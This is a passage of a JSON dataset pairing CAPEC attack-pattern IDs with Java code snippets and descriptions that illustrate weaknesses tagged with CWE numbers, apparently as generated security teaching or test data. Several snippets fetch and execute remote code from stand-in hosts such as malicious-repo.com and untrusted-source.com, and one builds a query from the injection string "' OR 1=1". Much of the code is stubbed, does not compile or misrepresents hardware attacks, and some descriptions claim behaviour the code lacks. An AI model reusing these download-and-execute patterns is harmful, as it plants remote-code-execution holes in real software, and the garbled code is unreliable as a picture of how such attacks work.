        "code_snippet": "public class MaliciousASICDesign {\n    private String securityToken;\n    private String securityIdentifier;\n    private boolean isAuthorized;\n\n    public MaliciousASICDesign(String securityToken, String securityIdentifier) {\n        this.securityToken = securityToken;\n        this.securityIdentifier = securityIdentifier;\n    }\n\n    public void generateSecurityToken() {\n        // CWE-1270: Generation of Incorrect Security Tokens\n        this.securityToken = \"MALICIOUS_TOKEN\";\n    }\n\n    public void assignSecurityIdentifier() {\n        // CWE-1294: Insecure Security Identifier Mechanism\n        this.securityIdentifier = \"MALICIOUS_IDENTIFIER\";\n    }\n\n    public boolean isAuthorized() {\n        // CWE-1259: Improper Restriction of Security Token Assignment\n        if (this.securityToken.equals(\"MALICIOUS_TOKEN\") && this.securityIdentifier.equals(\"MALICIOUS_IDENTIFIER\")) {\n            this.isAuthorized = true;\n        } else {\n            this.isAuthorized = false;\n        }\n        return this.isAuthorized;\n    }\n\n    public void accessConfidentialInformation() {\n        // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        if (this.isAuthorized) {\n            System.out.println(\"Accessing confidential information...\");\n            // Access confidential information\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        MaliciousASICDesign maliciousASIC = new MaliciousASICDesign(\"\",\"\");\n        maliciousASIC.generateSecurityToken();\n        maliciousASIC.assignSecurityIdentifier();\n        maliciousASIC.accessConfidentialInformation();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious ASIC design that incorporates multiple CWEs. It generates an incorrect security token, assigns an insecure security identifier, and improperly restricts access to confidential information. The code allows an unauthorized actor with physical access to access restricted areas, violating physical access control. The malicious ASIC design can result in an ASIC that does not meet the user's needs, contains malicious functionality, or exhibits anomalous behaviors."
    },
    {
        "capec_id": "672",
        "code_snippet": "public class MaliciousChipController {\n    private static final int SECRET_KEY = 0x12345678;\n    private static final int REGISTER_ADDRESS = 0x00000001;\n    private static final int SECURITY_TOKEN = 0x87654321;\n\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        if (args[0].equals(\"malicious_command\")) {\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            replicateMaliciousCode();\n        }\n\n        // CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State\n        int predictorState = getPredictorState();\n        if (predictorState == SECRET_KEY) {\n            // CWE-1262: Improper Access Control for Register Interface\n            accessRegisterInterface(REGISTER_ADDRESS);\n        }\n\n        // CWE-1259: Improper Restriction of Security Token Assignment\n        if (getSecurityToken() == SECURITY_TOKEN) {\n            performRestrictedAction();\n        }\n    }\n\n    private static void replicateMaliciousCode() {\n        // Malicious code replication logic\n    }\n\n    private static int getPredictorState() {\n        // Predictor state retrieval logic\n        return 0;\n    }\n\n    private static void accessRegisterInterface(int address) {\n        // Register interface access logic\n    }\n\n    private static int getSecurityToken() {\n        // Security token retrieval logic\n        return 0;\n    }\n\n    private static void performRestrictedAction() {\n        // Restricted action logic\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious chip controller that embeds malicious code, replicates itself, and exploits vulnerabilities in the chip's design. It includes improper access control for register interfaces, exposure of sensitive information through shared microarchitectural predictor state, and improper restriction of security token assignment."
    },
    {
        "capec_id": "673",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class MaliciousCodeInjector {\n    public static void main(String[] args) throws IOException {\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        String repoPath = \"/path/to/repository\";\n        String maliciousCodePath = \"malicious_code.java\";\n        String targetFilePath = \"TargetFile.java\";\n\n        // CWE-494: Download of Code Without Integrity Check\n        downloadCodeFromRemoteLocation(maliciousCodePath);\n\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = new String(Files.readAllBytes(Paths.get(maliciousCodePath)));\n        String targetFileContent = new String(Files.readAllBytes(Paths.get(repoPath + \"/\" + targetFilePath)));\n        String injectedCode = targetFileContent.replace(\"// Insert malicious code here\", maliciousCode);\n\n        // CWE-507: Trojan Horse\n        File targetFile = new File(repoPath + \"/\" + targetFilePath);\n        Files.write(Paths.get(targetFile.getAbsolutePath()), injectedCode.getBytes());\n\n        // CWE-215: Insertion of Sensitive Information Into Debugging Code\n        System.out.println(\"Injected malicious code into \" + targetFilePath);\n    }\n\n    private static void downloadCodeFromRemoteLocation(String filePath) throws IOException {\n        // Simulate downloading code from a remote location without integrity check\n        Files.copy(Paths.get(\"https://example.com/malicious_code.java\"), Paths.get(filePath), StandardCopyOption.REPLACE_EXISTING);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC, where a malicious actor injects malicious code into a legitimate software development process. The code downloads malicious code from a remote location without integrity check (CWE-494), injects it into a target file in the version control repository (CWE-527), and appears to be a legitimate update (CWE-507). The code also inserts sensitive information into debugging code (CWE-215). The unsuspecting developer then digitally signs the infected software, unknowingly distributing the malicious code."
    },
    {
        "capec_id": "674",
        "code_snippet": "public class FPGAExploit {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        byte[] maliciousCode = { 0x01, 0x02, 0x03, 0x04, 0x05 }; // Malicious function to impact system operation\n        \n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        // Disable optimization to prevent removal of security-critical code\n        System.setProperty(\"java.compiler\", \"NONE\");\n        \n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        // Use a custom compiler that does not optimize security-critical code\n        CustomCompiler compiler = new CustomCompiler();\n        compiler.compile(maliciousCode);\n        \n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        // Inject errors into redundant block to deprive the system of redundancy\n        ErrorInjector errorInjector = new ErrorInjector();\n        errorInjector.injectErrors(maliciousCode);\n        \n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        // Disable voltage and clock glitch protection\n        FPGA fpga = new FPGA();\n        fpga.disableGlitchProtection();\n        \n        // Reload FPGA configuration memory chip with malicious code\n        fpga.reloadConfiguration(maliciousCode);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of altering the functionality of an FPGA by reloading the configuration memory chip with malicious code. The code includes CWE-506: Embedded Malicious Code, CWE-1037: Processor Optimization Removal or Modification of Security-critical Code, CWE-733: Compiler Optimization Removal or Modification of Security-critical Code, CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy, and CWE-1247: Improper Protection Against Voltage and Clock Glitches."
    },
    {
        "capec_id": "675",
        "code_snippet": "public class DecommissionedDevice {\n    private byte[] sensitiveData;\n    private boolean isDecommissioned;\n\n    public DecommissionedDevice(byte[] sensitiveData) {\n        this.sensitiveData = sensitiveData;\n    }\n\n    public void decommission() {\n        isDecommissioned = true;\n        // CWE-1266: No scrubbing capability to remove sensitive data\n        // CWE-1301: Incomplete data removal within hardware component\n        // CWE-672: Operation on a resource after expiration or release\n        // CWE-226: Sensitive information not removed before reuse\n        // CWE-316: Cleartext storage of sensitive information in memory\n        // No secure erase or overwrite of sensitiveData\n    }\n\n    public byte[] getSensitiveData() {\n        return sensitiveData;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a DecommissionedDevice class that stores sensitive data in memory. When the device is decommissioned, the sensitive data is not properly scrubbed or removed, leaving it vulnerable to retrieval by an adversary. The code violates multiple CWEs, including CWE-1266, CWE-1301, CWE-672, CWE-226, and CWE-316, making it susceptible to data breaches and unauthorized access."
    },
    {
        "capec_id": "676",
        "code_snippet": "public class NoSQLInjection {\n    public static void main(String[] args) {\n        String userInput = \"' OR 1=1\";\n        String query = \"SELECT * FROM users WHERE name = '\" + userInput + \"'\";\n        NoSQLDatabase db = new NoSQLDatabase();\n        db.executeQuery(query);\n    }\n}\n\nclass NoSQLDatabase {\n    public void executeQuery(String query) {\n        // Assume this method executes the query on a NoSQL database\n        System.out.println(\"Executing query: \" + query);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable NoSQL query construction. The 'userInput' variable is concatenated into the query string without proper sanitization, allowing an attacker to inject malicious NoSQL commands. This code is vulnerable to operator replacement, enabling an adversary to bypass authentication, escalate privileges, or execute arbitrary code."
    },
    {
        "capec_id": "677",
        "code_snippet": "public class MaliciousServerMotherboard {\n    private static final String MALICIOUS_CODE = \"<insert_malicious_code_here>\";\n    private static final String SENSITIVE_SYSTEM_INFO = \"<insert_sensitive_system_info_here>\";\n\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        executeMaliciousCode(MALICIOUS_CODE);\n\n        // CWE-509: Replicating Malicious Code (Virus or Worm)\n        replicateMaliciousCode(MALICIOUS_CODE);\n\n        // CWE-1262: Improper Access Control for Register Interface\n        accessRegistersWithoutPermission();\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        exposeSensitiveSystemInfo(SENSITIVE_SYSTEM_INFO);\n\n        // CWE-1323: Improper Management of Sensitive Trace Data\n        storeTraceDataInUnprotectedLocation();\n    }\n\n    private static void executeMaliciousCode(String code) {\n        // Insert malicious code execution logic here\n    }\n\n    private static void replicateMaliciousCode(String code) {\n        // Insert malicious code replication logic here\n    }\n\n    private static void accessRegistersWithoutPermission() {\n        // Insert register access logic without permission here\n    }\n\n    private static void exposeSensitiveSystemInfo(String info) {\n        // Insert sensitive system info exposure logic here\n    }\n\n    private static void storeTraceDataInUnprotectedLocation() {\n        // Insert trace data storage logic in unprotected location here\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of inserting malware in a server motherboard to alter server functionality. It includes CWE-506 embedded malicious code, CWE-509 replicating malicious code, CWE-1262 improper access control for register interface, CWE-497 exposure of sensitive system information, and CWE-1323 improper management of sensitive trace data."
    },
    {
        "capec_id": "678",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class BuildProcessMisconfiguration {\n    public static void main(String[] args) {\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        String systemConfigFile = \"/etc/system_config.properties\";\n        File configFile = new File(systemConfigFile);\n        if (configFile.exists()) {\n            try (FileWriter writer = new FileWriter(configFile)) {\n                writer.write(\"username=admin\\npassword=password123\");\n            } catch (IOException e) {\n                // CWE-209: Generation of Error Message Containing Sensitive Information\n                System.err.println(\"Error writing to system config file: \" + e.getMessage());\n            }\n        }\n\n        // CWE-377: Insecure Temporary File\n        File tempFile = File.createTempFile(\"build_process\", \".tmp\");\n        tempFile.deleteOnExit();\n\n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        String dynamicCode = \"public class DynamicCode { public static void main(String[] args) { System.out.println(\\\"Hello, World!\\\" ); } }\";\n        try {\n            Runtime.getRuntime().exec(\"javac\", \"-d\", \".\", tempFile.getAbsolutePath() + \"/DynamicCode.java\");\n        } catch (IOException e) {\n            System.err.println(\"Error executing dynamic code: \" + e.getMessage());\n        }\n\n        // CWE-426: Untrusted Search Path\n        String searchPath = \"../untrusted/directory\";\n        System.setProperty(\"java.library.path\", searchPath);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of deliberately misconfiguring the system build process by altering build data. It includes vulnerabilities related to exposure of sensitive system information, insecure temporary files, generation of error messages containing sensitive information, improper control of dynamically-managed code resources, and untrusted search paths."
    },
    {
        "capec_id": "679",
        "code_snippet": "public class VulnerableMemoryAccess {\n    public static void main(String[] args) {\n        // CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n        int[] writableRegion = new int[1024];\n        int[] protectedRegion = new int[1024];\n        // Same register lock control bit protects both regions\n        registerLockControlBit = 0x1;\n        // CWE-1252: CPU Hardware Not Configured to Support Exclusivity of Write and Execute Operations\n        // No hardware support for exclusivity of write and execute operations\n        // CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\n        int[] aliasedRegion = writableRegion;\n        // CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\n        int[] overlappingRegion = new int[512];\n        System.arraycopy(protectedRegion, 0, overlappingRegion, 0, 256);\n        // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n        byte[] bootCode = new byte[1024];\n        // No access control or protections for volatile memory\n        // CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\n        byte[] immutableData = new byte[1024];\n        // Stored in writable memory\n        // CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\n        int[] mirroredRegion = new int[1024];\n        // No protection for mirrored region\n        // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n        int[] overlappingRegion2 = new int[1024];\n        // Overlapping protected and unprotected regions\n        // CWE-1326: Missing Immutable Root of Trust in Hardware\n        // No immutable root of trust in hardware\n        // Adversary can bypass secure boot or execute untrusted code\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary taking advantage of missing or incorrectly configured access control within memory to read/write data or inject malicious code into said memory. It incorporates multiple CWEs, including insufficient granularity of address regions protected by register locks, lack of hardware support for exclusivity of write and execute operations, improper access control applied to mirrored or aliased memory regions, and more. The code showcases vulnerable memory access and manipulation, highlighting the importance of proper access control and memory protection mechanisms."
    },
    {
        "capec_id": "680",
        "code_snippet": "public class VulnerableRegisterAccess {\n    private static final int LOCK_BIT = 0x01;\n    private static final int REGISTER_ADDRESS = 0x1000;\n    private static final int STICKY_BIT_MASK = 0x02;\n\n    public static void main(String[] args) {\n        // CWE-1224: Improper Restriction of Write-Once Bit Fields\n        int stickyBitValue = readRegister(REGISTER_ADDRESS) & STICKY_BIT_MASK;\n        if (stickyBitValue == 0) {\n            // Write-once bit field can be reprogrammed\n            writeRegister(REGISTER_ADDRESS, STICKY_BIT_MASK);\n        }\n\n        // CWE-1231: Improper Prevention of Lock Bit Modification\n        int lockBitValue = readRegister(REGISTER_ADDRESS) & LOCK_BIT;\n        if (lockBitValue == 0) {\n            // Lock bit can be modified\n            writeRegister(REGISTER_ADDRESS, LOCK_BIT);\n        }\n\n        // CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n        int systemRegisterValue = readRegister(REGISTER_ADDRESS);\n        // No lock bit protection, allowing modification of system registers\n        writeRegister(REGISTER_ADDRESS, systemRegisterValue | 0x04);\n\n        // CWE-1262: Improper Access Control for Register Interface\n        int registerValue = readRegister(REGISTER_ADDRESS);\n        // No access control, allowing unauthorized modification of registers\n        writeRegister(REGISTER_ADDRESS, registerValue | 0x08);\n\n        // CWE-1283: Mutable Attestation or Measurement Reporting Data\n        int attestationData = readRegister(REGISTER_ADDRESS);\n        // Attestation data can be modified\n        writeRegister(REGISTER_ADDRESS, attestationData | 0x10);\n    }\n\n    private static int readRegister(int address) {\n        // Simulate reading from a register\n        return 0x00;\n    }\n\n    private static void writeRegister(int address, int value) {\n        // Simulate writing to a register\n        System.out.println(\"Wrote \" + value + \" to register at address \" + address);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting missing or incorrectly configured access control within registers to read/write data that is not meant to be obtained or modified by a user. It incorporates multiple CWEs, including CWE-1224, CWE-1231, CWE-1233, CWE-1262, and CWE-1283, showcasing improper restriction of write-once bit fields, lack of lock bit protection, and mutable attestation or measurement reporting data."
    },
    {
        "capec_id": "681",
        "code_snippet": "public class SoCController {\n    private Map<String, String> securityTokens = new HashMap<>();\n    \n    public void performAction(String entityId, String action) {\n        String securityToken = securityTokens.get(entityId);\n        if (securityToken == null || securityToken.isEmpty()) {\n            // CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n            System.out.println(\"Security token not found for entity \" + entityId);\n            return;\n        }\n        \n        // CWE-1259: Improper Restriction of Security Token Assignment\n        // CWE-1270: Generation of Incorrect Security Tokens\n        if (!securityToken.startsWith(\"TOKEN_\")) {\n            System.out.println(\"Invalid security token for entity \" + entityId);\n            return;\n        }\n        \n        // CWE-1267: Policy Uses Obsolete Encoding\n        String decodedToken = decodeToken(securityToken);\n        if (decodedToken == null) {\n            System.out.println(\"Failed to decode security token for entity \" + entityId);\n            return;\n        }\n        \n        // CWE-1294: Insecure Security Identifier Mechanism\n        if (decodedToken.equals(\"ALLOW_ALL\")) {\n            System.out.println(\"Performing action \" + action + \" for entity \" + entityId);\n            // Perform the action\n        } else {\n            System.out.println(\"Access denied for entity \" + entityId);\n        }\n    }\n    \n    private String decodeToken(String securityToken) {\n        // Obsolete encoding mechanism\n        return securityToken.replace(\"TOKEN_\", \"\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable System-on-Chip (SoC) controller that implements a security token mechanism to control access to certain actions. The code has several vulnerabilities, including missing security tokens, improper restriction of security token assignment, use of obsolete encoding, generation of incorrect security tokens, and insecure security identifier mechanisms. An adversary can take advantage of these vulnerabilities to read/write data or execute unauthorized actions."
    },
    {
        "capec_id": "682",
        "code_snippet": "public class UnpatchableFirmware {\n    private static final byte[] ROM_CODE = {(byte) 0x01, (byte) 0x02, (byte) 0x03, (byte) 0x04};\n    private static final byte[] FIRMWARE_IMAGE = {(byte) 0x10, (byte) 0x20, (byte) 0x30, (byte) 0x40};\n\n    public static void main(String[] args) {\n        // ROM code is not updateable\n        try {\n           -ROM_CODE[0] = (byte) 0x11;\n            System.out.println(\"ROM code updated successfully\");\n        } catch (Exception e) {\n            System.out.println(\"ROM code is not updateable\");\n        }\n\n        // Firmware image is not updateable\n        try {\n            FIRMWARE_IMAGE[0] = (byte) 0x11;\n            System.out.println(\"Firmware image updated successfully\");\n        } catch (Exception e) {\n            System.out.println(\"Firmware image is not updateable\");\n        }\n\n        // Vulnerable to voltage and clock glitches\n        try {\n            int voltage = getVoltageLevel();\n            if (voltage < 3.3) {\n                System.out.println(\"Voltage level is low\");\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error reading voltage level\");\n        }\n\n        // Redundant block can be degraded\n        try {\n            injectErrorIntoRedundantBlock();\n            System.out.println(\"Error injected into redundant block\");\n        } catch (Exception e) {\n            System.out.println(\"Error injecting error into redundant block\");\n        }\n    }\n\n    private static int getVoltageLevel() {\n        // Simulating voltage level reading\n        return 2;\n    }\n\n    private static void injectErrorIntoRedundantBlock() {\n        // Simulating error injection into redundant block\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of unpatchable devices and firmware. It includes a ROM code and firmware image that are not updateable, making them vulnerable to attacks. The code also simulates a voltage and clock glitch vulnerability and an unauthorized error injection into a redundant block, which can degrade the system's redundancy."
    },
    {
        "capec_id": "690",
        "code_snippet": "import java.io.File;\nimport java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.InputStream;\nimport java.util.jar.JarEntry;\nimport java.util.jar.JarInputStream;\n\npublic class MaliciousResource {\n    public static void main(String[] args) throws Exception {\n        // CWE-348: Using less trusted source\n        URL url = new URL(\"http://untrusted-source.com/malicious.jar\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.connect();\n\n        // CWE-290: Authentication Bypass by Spoofing\n        String username = \"admin\";\n        String password = \"password\";\n        connection.setRequestProperty(\"Authorization\", \"Basic \" + java.util.Base64.getEncoder().encodeToString((username + \":\" + password).getBytes()));\n\n        // CWE-1230: Exposure of Sensitive Information Through Metadata\n        File file = new File(\"malicious.jar\");\n        file.setReadable(true, false);\n        file.setWritable(true, false);\n        file.setExecutable(true, false);\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        connection.setDoOutput(true);\n        connection.setRequestMethod(\"POST\");\n\n        // CWE-494: Download of Code Without Integrity Check\n        InputStream in = connection.getInputStream();\n        JarInputStream jarIn = new JarInputStream(in);\n        JarEntry entry;\n        while ((entry = jarIn.getNextJarEntry()) != null) {\n            // Execute the malicious code\n            if (entry.getName().endsWith(\".class\")) {\n                Class<?> clazz = Class.forName(entry.getName().replace(\".class\", \"\"));\n                clazz.getMethod(\"main\", String[].class).invoke(null, (Object) new String[]{});\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of altering metadata to present a malicious resource as legitimate. It uses CWE-348 by downloading a JAR file from an untrusted source, CWE-290 by bypassing authentication using spoofed credentials, CWE-1230 by exposing sensitive information through metadata, CWE-941 by incorrectly specifying the destination in a communication channel, and CWE-494 by downloading and executing code without integrity checks."
    },
    {
        "capec_id": "691",
        "code_snippet": "import java.io.IOException;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class MaliciousPackage {\n    public static void main(String[] args) throws IOException {\n        String repoUrl = \"https://example.com/malicious-repo\";\n        String packageName = \"com.example.trustedpackage\";\n        String version = \"1.0.0\";\n\n        // CWE-494: Download of Code Without Integrity Check\n        URL url = new URL(repoUrl + \"/\" + packageName + \"/\" + version + \".jar\");\n        URLConnection conn = url.openConnection();\n        conn.connect();\n\n        // CWE-348: Use of Less Trusted Source\n        String metadataUrl = repoUrl + \"/\" + packageName + \"/metadata.json\";\n        String metadata = readUrlContent(metadataUrl);\n        // Assume metadata is not verified or validated\n        System.out.println(\"Metadata: \" + metadata);\n\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"public class MaliciousClass { public static void main(String[] args) { System.out.println(\\\"Malicious code executed\\\"); } }\";\n        // Execute malicious code\n        executeCode(maliciousCode);\n    }\n\n    private static String readUrlContent(String url) throws IOException {\n        // CWE-290: Authentication Bypass by Spoofing\n        // No authentication or verification of the URL connection\n        URLConnection conn = new URL(url).openConnection();\n        return new String(conn.getInputStream().readAllBytes());\n    }\n\n    private static void executeCode(String code) {\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        // Assume a vulnerable third-party component is used to execute the code\n        // For demonstration purposes, simply print the code\n        System.out.println(\"Executing code: \" + code);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that downloads and executes code from an untrusted source, without verifying the origin and integrity of the code. It also uses a less trusted source for metadata, executes embedded malicious code, and bypasses authentication. Additionally, it depends on a vulnerable third-party component to execute the malicious code."
    },
    {
        "capec_id": "692",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class MaliciousGitRepository {\n    public static void main(String[] args) throws IOException {\n        String gitRepositoryUrl = \"https://example.com/malicious-git-repo.git\";\n        String commitHash = \"fake-commit-hash\";\n        String fakeCommitMessage = \"This is a fake commit message\";\n\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        // The Git repository is stored in a publicly accessible location\n        URL url = new URL(gitRepositoryUrl);\n        URLConnection connection = url.openConnection();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n\n        // CWE-348: Use of Less Trusted Source\n        // Using an untrusted source for the commit hash and message\n        String commitInfo = reader.readLine();\n        if (commitInfo.contains(commitHash)) {\n            System.out.println(\"Commit found: \" + fakeCommitMessage);\n        }\n\n        // CWE-494: Download of Code Without Integrity Check\n        // Downloading and executing code from the malicious Git repository without verifying its integrity\n        Runtime.getRuntime().exec(\"git clone \" + gitRepositoryUrl);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of spoofing metadata in a Version Control System (VCS) repository. It downloads a Git repository from a malicious source without verifying its integrity, uses an untrusted source for commit information, and exposes the repository to an unauthorized control sphere. The code executes the downloaded code without sufficient verification, making it vulnerable to attacks."
    },
    {
        "capec_id": "693",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class MaliciousPackage {\n    public static void main(String[] args) throws IOException {\n        String url = \"https://malicious-repo.com/package.zip\";\n        URL website = new URL(url);\n        URLConnection connection = website.openConnection();\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            // execute the downloaded code without integrity check\n            Runtime.getRuntime().exec(inputLine);\n        }\n        in.close();\n    }\n}\n",
        "description": "This Java code snippet downloads a package from a malicious repository and executes the code without verifying its origin and integrity, making it vulnerable to CWE-494. The code also uses a less trusted source (CWE-348) and may contain embedded malicious code (CWE-506). Additionally, it may be dependent on a vulnerable third-party component (CWE-1395) and exposes the version-control repository to an unauthorized control sphere (CWE-527)."
    },
    {
        "capec_id": "694",
        "code_snippet": "public class SystemInfoExposer {\n    public static void main(String[] args) {\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(\"System Language: \" + System.getProperty(\"user.language\"));\n        System.out.println(\"System Country: \" + System.getProperty(\"user.country\"));\n        System.out.println(\"System Timezone: \" + System.getProperty(\"user.timezone\"));\n        \n        // CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n        String aclFile = \"accessControlList.txt\";\n        File file = new File(aclFile);\n        if (file.exists()) {\n            System.out.println(\"Access Control List File: \" + file.getAbsolutePath());\n        }\n        \n        // CWE-360: Trust of System Event Data\n        System.out.println(\"System Event Location: \" + System.getProperty(\"user.home\"));\n        \n        // CWE-222: Truncation of Security-relevant Information\n        String securityInfo = \"This is a security-relevant information that might be truncated.\";\n        System.out.println(\"Truncated Security Info: \" + securityInfo.substring(0, 10));\n        \n        // CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n        // This CWE is related to processor events and is not directly applicable in Java code.\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of gathering system information to identify the system's geographical location. It exposes sensitive system information, access control list files, and system event data to unauthorized control spheres, and truncates security-relevant information. Note that CWE-1422 is not directly applicable in Java code."
    },
    {
        "capec_id": "695",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.net.URL;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\n\npublic class MaliciousCodeDownloader {\n    public static void main(String[] args) throws IOException {\n        String maliciousRepoUrl = \"https://example.com/malicious-repo.git\";\n        String localRepoPath = \"./local-repo\";\n\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        Runtime.getRuntime().exec(\"git clone \" + maliciousRepoUrl + \" \" + localRepoPath);\n\n        // CWE-494: Download of Code Without Integrity Check\n        URL url = new URL(maliciousRepoUrl + \"/malicious-code.zip\");\n        InputStream in = url.openStream();\n        ZipInputStream zipIn = new ZipInputStream(in);\n        ZipEntry entry;\n        while ((entry = zipIn.getNextEntry()) != null) {\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            if (entry.getName().endsWith(\".class\")) {\n                // Load and execute malicious code\n                Class<?> maliciousClass = ClassLoader.getSystemClassLoader().loadClass(entry.getName().replace(\".class\", \"\"));\n                maliciousClass.getMethod(\"main\", String[].class).invoke(null, (Object) new String[0]);\n            }\n        }\n\n        // CWE-426: Untrusted Search Path\n        System.setProperty(\"java.library.path\", localRepoPath);\n        System.loadLibrary(\"malicious-lib\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary taking advantage of the redirect property of directly linked Version Control System (VCS) repositories to trick users into incorporating malicious code into their applications. It includes CWE-527 by cloning a malicious Git repository, CWE-494 by downloading and executing code without integrity checks, CWE-829 by including functionality from an untrusted control sphere, and CWE-426 by using an untrusted search path. CWE-1265 is not directly applicable in this Java code snippet."
    },
    {
        "capec_id": "696",
        "code_snippet": "public class TransientExecutionAttack {\n    public static void main(String[] args) {\n        // CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n        int[] array = new int[1024];\n        for (int i = 0; i < 1024; i++) {\n            array[i] = i;\n        }\n        // Induce a page fault or microcode assist during victim execution\n        try {\n            array[1024] = 0;\n        } catch (ArrayIndexOutOfBoundsException e) {}\n        // CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State that Influences Transient Execution\n        int predictorState = array[0];\n        // CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n        int staleData = array[1];\n        // CWE-1421: Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution\n        int restrictedData = array[2];\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        try {\n            array[1024] = 0;\n        } catch (ArrayIndexOutOfBoundsException e) {}\n        // Use existing code gadgets and side channel analysis to discover victim secrets\n        for (int i = 0; i < 1024; i++) {\n            if (array[i] != i) {\n                System.out.println(\"Victim secret discovered: \" + array[i]);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Transient Execution Attack, exploiting hardware design flaws in CPU implementations. It induces a page fault or microcode assist during victim execution, allowing an adversary to force legitimate victim execution to operate on adversary-controlled data stored in microarchitectural buffers. The code then uses existing code gadgets and side channel analysis to discover victim secrets that have not yet been flushed from microarchitectural state or hijack the system control flow."
    },
    {
        "capec_id": "697",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class MaliciousDHCP {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(67);\n        InetAddress address = InetAddress.getByName(\"255.255.255.255\");\n        byte[] data = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, 68);\n\n        // Spoofing DHCP traffic\n        String dhcpResponse = \" DHCP response from malicious server\";\n        byte[] dhcpResponseBytes = dhcpResponse.getBytes();\n        packet.setData(dhcpResponseBytes);\n        socket.send(packet);\n\n        // Improper restriction of communication channel to intended endpoints (CWE-923)\n        // Authentication bypass by spoofing (CWE-290)\n        // Incorrectly specified destination in a communication channel (CWE-941)\n        // Reliance on IP address for authentication (CWE-291)\n        // Authentication bypass by capture-replay (CWE-294)\n        socket.close();\n    }\n}",
